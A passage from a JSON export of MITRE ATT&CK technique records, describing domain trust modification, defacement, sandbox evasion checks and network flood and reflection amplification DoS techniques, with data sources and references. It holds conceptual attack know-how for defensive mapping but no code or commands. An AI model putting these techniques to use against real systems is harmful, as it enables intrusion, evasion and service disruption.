        "description": "Robbins, A. (2018, April 2). A Red Teamer’s Guide to GPOs and OUs. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y Abusing GPO Permissions",
        "url": "http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/",
        "description": "Schroeder, W. (2016, March 17). Abusing GPO Permissions. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant M Trends 2016",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf",
        "description": "Mandiant. (2016, February 25). Mandiant M-Trends 2016. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Hacking Team Breach",
        "url": "https://www.microsoft.com/security/blog/2016/06/01/hacking-team-breach-a-cyber-jurassic-park/",
        "description": "Microsoft Secure Team. (2016, June 1). Hacking Team Breach: A Cyber Jurassic Park. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y SeEnableDelegationPrivilege Right",
        "url": "http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/",
        "description": "Schroeder, W. (2017, January 10). The Most Dangerous User Right You (Probably) Have Never Heard Of. Retrieved March 5, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee",
    "platform": "windows|azure-ad",
    "tid": "T1484.002",
    "technique": "Domain Trust Modification",
    "tactic": "defense-evasion",
    "datasources": "azure-activity-logs|powershell-logs|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.<!-- raw HTML omitted --><!-- raw HTML omitted -->Manipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge <a href=\"https://attack.mitre.org/techniques/T1606/002\">SAML Tokens</a>, without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft - Azure AD Federation",
        "url": "https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed",
        "description": "Microsoft. (2018, November 28). What is federation with Azure AD?. Retrieved December 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft - Azure Sentinel ADFSDomainTrustMods",
        "url": "https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/ADFSDomainTrustMods.yaml",
        "description": "Microsoft. (2020, December). Azure Sentinel Detections. Retrieved December 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Sygnia Golden SAML",
        "url": "https://www.sygnia.co/golden-saml-advisory",
        "description": "Sygnia. (2020, December). Detection and Hunting of Golden SAML Attack. Retrieved January 6, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "CISA SolarWinds Cloud Detection",
        "url": "https://us-cert.cisa.gov/ncas/alerts/aa21-008a",
        "description": "CISA. (2021, January 8). Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments. Retrieved January 8, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft - Update or Repair Federated domain",
        "url": "https://docs.microsoft.com/en-us/office365/troubleshoot/active-directory/update-federated-domain-office-365",
        "description": "Microsoft. (2020, September 14). Update or repair the settings of a federated domain in Office 365, Azure, or Intune. Retrieved December 30, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee",
    "platform": "windows|azure-ad",
    "tid": "T1484.002",
    "technique": "Domain Trust Modification",
    "tactic": "privilege-escalation",
    "datasources": "azure-activity-logs|powershell-logs|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.<!-- raw HTML omitted --><!-- raw HTML omitted -->Manipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge <a href=\"https://attack.mitre.org/techniques/T1606/002\">SAML Tokens</a>, without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft - Azure AD Federation",
        "url": "https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed",
        "description": "Microsoft. (2018, November 28). What is federation with Azure AD?. Retrieved December 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft - Azure Sentinel ADFSDomainTrustMods",
        "url": "https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/ADFSDomainTrustMods.yaml",
        "description": "Microsoft. (2020, December). Azure Sentinel Detections. Retrieved December 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Sygnia Golden SAML",
        "url": "https://www.sygnia.co/golden-saml-advisory",
        "description": "Sygnia. (2020, December). Detection and Hunting of Golden SAML Attack. Retrieved January 6, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "CISA SolarWinds Cloud Detection",
        "url": "https://us-cert.cisa.gov/ncas/alerts/aa21-008a",
        "description": "CISA. (2021, January 8). Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments. Retrieved January 8, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft - Update or Repair Federated domain",
        "url": "https://docs.microsoft.com/en-us/office365/troubleshoot/active-directory/update-federated-domain-office-365",
        "description": "Microsoft. (2020, September 14). Update or repair the settings of a federated domain in Office 365, Azure, or Intune. Retrieved December 30, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8c41090b-aa47-4331-986b-8c9a51a91103",
    "platform": "linux|macos|windows",
    "tid": "T1491.001",
    "technique": "Internal Defacement",
    "tactic": "impact",
    "datasources": "packet-capture|web-application-firewall-logs|web-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) Disturbing or offensive images may be used as a part of <a href=\"https://attack.mitre.org/techniques/T1491/001\">Internal Defacement</a> in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary’s presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)</p>\n",
    "technique_references": [
      {
        "source_name": "Novetta Blockbuster",
        "url": "https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf",
        "description": "Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February 25, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Novetta Blockbuster Destructive Malware",
        "url": "https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf",
        "description": "Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Destructive Malware Report. Retrieved March 2, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0cfe31a7-81fc-472c-bc45-e2808d1066a3",
    "platform": "linux|macos|windows|aws|gcp|azure",
    "tid": "T1491.002",
    "technique": "External Defacement",
    "tactic": "impact",
    "datasources": "packet-capture|web-application-firewall-logs|web-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) <a href=\"https://attack.mitre.org/techniques/T1491/002\">External Defacement</a> may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as <a href=\"https://attack.mitre.org/techniques/T1189\">Drive-by Compromise</a>.(Citation: Trend Micro Deep Dive Into Defacement)</p>\n",
    "technique_references": [
      {
        "source_name": "FireEye Cyber Threats to Media Industries",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/ib-entertainment.pdf",
        "description": "FireEye. (n.d.). Retrieved April 19, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Kevin Mandia Statement to US Senate Committee on Intelligence",
        "url": "https://www.intelligence.senate.gov/sites/default/files/documents/os-kmandia-033017.pdf",
        "description": "Kevin Mandia. (2017, March 30). Prepared Statement of Kevin Mandia, CEO of FireEye, Inc. before the United States Senate Select Committee on Intelligence. Retrieved April 19, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Anonymous Hackers Deface Russian Govt Site",
        "url": "https://torrentfreak.com/anonymous-hackers-deface-russian-govt-site-to-protest-web-blocking-nsfw-180512/",
        "description": "Andy. (2018, May 12). ‘Anonymous’ Hackers Deface Russian Govt. Site to Protest Web-Blocking (NSFW). Retrieved April 19, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Trend Micro Deep Dive Into Defacement",
        "url": "https://documents.trendmicro.com/assets/white_papers/wp-a-deep-dive-into-defacement.pdf",
        "description": "Marco Balduzzi, Ryan Flores, Lion Gu, Federico Maggi, Vincenzo Ciancaglini, Roel Reyes, Akira Urano. (n.d.). A Deep Dive into Defacement: How Geopolitical Events Trigger Web Attacks. Retrieved April 19, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--29be378d-262d-4e99-b00d-852d573628e6",
    "platform": "linux|macos|windows",
    "tid": "T1497.001",
    "technique": "System Checks",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from <a href=\"https://attack.mitre.org/techniques/T1497\">Virtualization/Sandbox Evasion</a> during automated discovery to shape follow-on behaviors. <!-- raw HTML omitted --><!-- raw HTML omitted -->Specific checks may will vary based on the target and/or adversary, but may involve behaviors such as <a href=\"https://attack.mitre.org/techniques/T1047\">Windows Management Instrumentation</a>, <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a>, <a href=\"https://attack.mitre.org/techniques/T1082\">System Information Discovery</a>, and <a href=\"https://attack.mitre.org/techniques/T1012\">Query Registry</a> to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. <!-- raw HTML omitted --><!-- raw HTML omitted -->Checks could include generic system properties such as uptime and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. <!-- raw HTML omitted --><!-- raw HTML omitted -->Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. <!-- raw HTML omitted --> <!-- raw HTML omitted -->Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)</p>\n",
    "technique_references": [
      {
        "source_name": "McAfee Virtual Jan 2017",
        "url": "https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/stopping-malware-fake-virtual-machine/",
        "description": "Roccia, T. (2017, January 19). Stopping Malware With a Fake Virtual Machine. Retrieved April 17, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 OilRig Sept 2018",
        "url": "https://researchcenter.paloaltonetworks.com/2018/09/unit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie/",
        "description": "Falcone, R., et al. (2018, September 04). OilRig Targets a Middle Eastern Government and Adds Evasion Techniques to OopsIE. Retrieved September 24, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--29be378d-262d-4e99-b00d-852d573628e6",
    "platform": "linux|macos|windows",
    "tid": "T1497.001",
    "technique": "System Checks",
    "tactic": "discovery",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from <a href=\"https://attack.mitre.org/techniques/T1497\">Virtualization/Sandbox Evasion</a> during automated discovery to shape follow-on behaviors. <!-- raw HTML omitted --><!-- raw HTML omitted -->Specific checks may will vary based on the target and/or adversary, but may involve behaviors such as <a href=\"https://attack.mitre.org/techniques/T1047\">Windows Management Instrumentation</a>, <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a>, <a href=\"https://attack.mitre.org/techniques/T1082\">System Information Discovery</a>, and <a href=\"https://attack.mitre.org/techniques/T1012\">Query Registry</a> to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. <!-- raw HTML omitted --><!-- raw HTML omitted -->Checks could include generic system properties such as uptime and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. <!-- raw HTML omitted --><!-- raw HTML omitted -->Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. <!-- raw HTML omitted --> <!-- raw HTML omitted -->Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)</p>\n",
    "technique_references": [
      {
        "source_name": "McAfee Virtual Jan 2017",
        "url": "https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/stopping-malware-fake-virtual-machine/",
        "description": "Roccia, T. (2017, January 19). Stopping Malware With a Fake Virtual Machine. Retrieved April 17, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 OilRig Sept 2018",
        "url": "https://researchcenter.paloaltonetworks.com/2018/09/unit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie/",
        "description": "Falcone, R., et al. (2018, September 04). OilRig Targets a Middle Eastern Government and Adds Evasion Techniques to OopsIE. Retrieved September 24, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--91541e7e-b969-40c6-bbd8-1b5352ec2938",
    "platform": "linux|macos|windows",
    "tid": "T1497.002",
    "technique": "User Activity Based Checks",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from <a href=\"https://attack.mitre.org/techniques/T1497\">Virtualization/Sandbox Evasion</a> during automated discovery to shape follow-on behaviors. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Sans Virtual Jan 2016",
        "url": "https://www.sans.org/reading-room/whitepapers/forensics/detecting-malware-sandbox-evasion-techniques-36667",
        "description": "Keragala, D. (2016, January 16). Detecting Malware and Sandbox Evasion Techniques. Retrieved April 17, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 Sofacy Nov 2018",
        "url": "https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/",
        "description": "Falcone, R., Lee, B.. (2018, November 20). Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye FIN7 April 2017",
        "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html",
        "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--91541e7e-b969-40c6-bbd8-1b5352ec2938",
    "platform": "linux|macos|windows",
    "tid": "T1497.002",
    "technique": "User Activity Based Checks",
    "tactic": "discovery",
    "datasources": "process-command-line-parameters|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from <a href=\"https://attack.mitre.org/techniques/T1497\">Virtualization/Sandbox Evasion</a> during automated discovery to shape follow-on behaviors. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Sans Virtual Jan 2016",
        "url": "https://www.sans.org/reading-room/whitepapers/forensics/detecting-malware-sandbox-evasion-techniques-36667",
        "description": "Keragala, D. (2016, January 16). Detecting Malware and Sandbox Evasion Techniques. Retrieved April 17, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 Sofacy Nov 2018",
        "url": "https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/",
        "description": "Falcone, R., Lee, B.. (2018, November 20). Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye FIN7 April 2017",
        "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html",
        "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0",
    "platform": "linux|macos|windows",
    "tid": "T1497.003",
    "technique": "Time Based Evasion",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: <a href=\"https://attack.mitre.org/techniques/T1053\">Scheduled Task/Job</a>). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled <a href=\"https://attack.mitre.org/techniques/T1104\">Multi-Stage Channels</a> to avoid analysis and scrutiny.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0",
    "platform": "linux|macos|windows",
    "tid": "T1497.003",
    "technique": "Time Based Evasion",
    "tactic": "discovery",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: <a href=\"https://attack.mitre.org/techniques/T1053\">Scheduled Task/Job</a>). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled <a href=\"https://attack.mitre.org/techniques/T1104\">Multi-Stage Channels</a> to avoid analysis and scrutiny.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
    "platform": "linux|macos|windows|aws|gcp|azure-ad|saas|azure|office-365",
    "tid": "T1498.001",
    "technique": "Direct Network Flood",
    "tactic": "impact",
    "datasources": "netflow-enclave-netflow|network-device-logs|network-intrusion-detection-system|network-protocol-analysis|sensor-health-and-status",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. <a href=\"https://attack.mitre.org/techniques/T1498/001\">Direct Network Flood</a> are when one or more systems are used to send a high-volume of network packets towards the targeted service’s network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.<!-- raw HTML omitted --><!-- raw HTML omitted -->Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/125.html",
        "description": "none",
        "external_id": "CAPEC-125"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/486.html",
        "description": "none",
        "external_id": "CAPEC-486"
      },
      {
        "source_name": "USNYAG IranianBotnet March 2016",
        "url": "https://www.justice.gov/opa/pr/seven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged",
        "description": "Preet Bharara, US Attorney. (2016, March 24). Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco DoSdetectNetflow",
        "url": "https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf",
        "description": "Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--36b2a1d7-e09e-49bf-b45e-477076c2ec01",
    "platform": "macos|windows|linux|aws|office-365|azure-ad|gcp|azure|saas",
    "tid": "T1498.002",
    "technique": "Reflection Amplification",
    "tactic": "impact",
    "datasources": "netflow-enclave-netflow|network-device-logs|network-intrusion-detection-system|network-protocol-analysis|sensor-health-and-status",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to cause a denial of service by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflector may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/490.html",
        "description": "none",
        "external_id": "CAPEC-490"
      },
      {
        "source_name": "Cloudflare ReflectionDoS May 2017",
        "url": "https://blog.cloudflare.com/reflections-on-reflections/",
        "description": "Marek Majkowsk, Cloudflare. (2017, May 24). Reflections on reflection (attacks). Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cloudflare DNSamplficationDoS",
        "url": "https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/",
        "description": "Cloudflare. (n.d.). What is a DNS amplification attack?. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cloudflare NTPamplifciationDoS",
        "url": "https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/",
        "description": "Cloudflare. (n.d.). What is a NTP amplificaiton attack?. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Arbor AnnualDoSreport Jan 2018",
        "url": "https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf",
        "description": "Philippe Alcoy, Steinthor Bjarnason, Paul Bowen, C.F. Chui, Kirill Kasavchnko, and Gary Sockrider of Netscout Arbor. (2018, January). Insight into the Global Threat Landscape - Netscout Arbor's 13th Annual Worldwide Infrastructure Security Report. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cloudflare Memcrashed Feb 2018",
        "url": "https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/",
        "description": "Marek Majkowski of Cloudflare. (2018, February 27). Memcrashed - Major amplification attacks from UDP port 11211. Retrieved April 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco DoSdetectNetflow",
        "url": "https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf",
        "description": "Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
